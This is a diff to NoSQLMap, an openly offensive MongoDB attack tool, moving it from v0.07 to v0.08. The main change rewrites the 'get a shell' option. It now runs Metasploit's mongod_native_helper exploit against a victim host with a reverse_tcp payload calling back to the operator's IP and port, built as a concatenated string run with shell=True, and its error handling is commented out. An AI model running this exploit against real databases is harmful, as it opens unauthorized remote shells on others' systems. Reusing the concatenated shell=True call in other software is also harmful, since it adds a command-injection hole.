@@ -21,7 +21,7 @@ import os
 import httplib2
 import urllib
 import pymongo
-from subprocess import call
+import subprocess
 
 #Set a list so we can track whether options are set or not
 global optionSet
@@ -32,7 +32,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.07-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.08-by Russell Butturini(tcstool@gmail.com)"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -205,11 +205,11 @@ def netAttacks(target):
 		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
 		
 		if getShell == "y" or getShell == "Y":
-			try:
-				call["msfcli","exploit/linux/misc/mongod_native_helper","RHOST=" + victim,"DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=" + myIP, "LPORT="+ myPort, "E" ]
+			#try:
+			proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
 			
-			except:
-				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
+			#except:
+			#	print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
 	
 	raw_input("Press enter to continue...")
 	return()
